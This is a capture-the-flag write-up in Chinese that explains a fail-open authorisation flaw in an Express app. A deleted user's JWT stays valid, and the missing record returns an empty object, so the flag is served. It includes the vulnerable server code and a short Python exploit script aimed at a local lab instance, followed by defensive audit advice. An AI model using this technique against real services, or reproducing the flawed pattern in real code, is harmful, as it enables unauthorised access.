# week4profile

## 题目简述

题目提供了一个基于 Express 的用户系统。用户注册后会得到包含 `uid` 的 HS256 JWT；访问个人资料时，服务端根据 JWT 中的 `uid` 查询用户，并用 `restricted` 字段决定返回个人简介还是 flag。目标是在不知道 JWT 密钥的情况下绕过该限制。

## 解题过程

关键代码可归纳为：

~~~javascript
get(uid) {
    return this.users[uid] ?? {};
}

app.post("/delete", (req, res) => {
    if (res.locals.user) {
        users.remove(res.locals.user.uid);
    }
    res.clearCookie("token");
    res.send("已成功删除该用户");
});

app.get("/profile", (req, res) => {
    if (!res.locals.user) {
        res.status(401).send("请先登录");
        return;
    }
    const user = users.get(res.locals.user.uid);
    res.send(user.restricted ? user.profile : flag);
});
~~~

JWT 只证明其中的 `uid` 由服务端签发，并不保证该用户当前仍存在。删除账户时，服务端删除了内存中的用户记录，并通过响应要求浏览器清除 Cookie，但没有让已经签发的 JWT 失效。只要保留删除前的 token，就仍能通过 JWT 校验。

此后 `users.get(uid)` 找不到记录，会因空值合并运算符返回 `{}`。空对象没有 `restricted` 属性，因此 `user.restricted` 的值为 `undefined`，在三元表达式中按假值处理，服务端便返回 flag。

利用时不能让会话自动接受 `/delete` 返回的清 Cookie 指令，所以先保存 token，再在每个请求中手动携带：

~~~python
import requests

BASE_URL = "http://127.0.0.1:3000"

register = requests.post(
    f"{BASE_URL}/register",
    data={"username": "test_user", "password": "test_pass"},
    timeout=10,
)
register.raise_for_status()
token = register.cookies["token"]
cookies = {"token": token}

# 响应会要求清除 token，但这里保留原 cookies 字典，不接收该变更。
delete = requests.post(f"{BASE_URL}/delete", cookies=cookies, timeout=10)
delete.raise_for_status()

profile = requests.get(f"{BASE_URL}/profile", cookies=cookies, timeout=10)
profile.raise_for_status()
print(profile.text)
~~~

## 方法总结

漏洞本质是认证状态与业务对象生命周期脱节：JWT 在用户删除后仍然有效，而查询不存在的用户又返回了一个缺少权限字段的空对象，最终形成 fail-open。审计类似逻辑时，应同时检查 token 撤销、对象不存在时的返回值，以及权限字段缺失时是否默认拒绝。
